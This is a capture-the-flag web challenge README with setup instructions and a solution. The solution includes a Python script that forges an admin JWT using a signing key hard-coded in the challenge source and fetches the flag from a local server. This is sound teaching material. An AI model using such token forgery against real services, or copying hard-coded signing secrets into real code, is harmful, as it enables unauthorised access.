# GoSecureIt
<b>Author</b>: [Schrödy](https://github.com/AndreaGordanelli)<br>
<b>Category</b>: Web<br>
<b>Solves</b>: 95<br>

## Descritpion
I've found this website under construction, at the moment you can only register, but I think there's something strange in the cookie

## How to run the server
To run the server you'll need [`docker`](https://docs.docker.com/get-docker/).<br>
Go into the `src` folder and from the command line run `docker compose up --build -d`.<br>
Now you can connect to the server by opening [`http://localhost:2301/`](http://localhost:2301/) in your browser.<br>To stop the server, from the command line run `docker compose down`.

## Solution
Inside "secret/secret.go" there is a secret key that can be used to sign a jwt written by us, by changing the "role" parameter from "user" to "admin" we can send a GET request to /flag and obtain the flag

```python 3

import jwt
import datetime

import requests

secret_key = "schrody_is_always_watching"
url = "http://localhost:2301/flag"

payload = {
    "role": "admin",
    "exp": datetime.datetime.now(datetime.UTC) + datetime.timedelta(hours=1),
    "iat": datetime.datetime.now(datetime.UTC)
}

token = jwt.encode(payload, secret_key, algorithm="HS256")

print(requests.get(url, cookies={"jwt": token}).text)

```
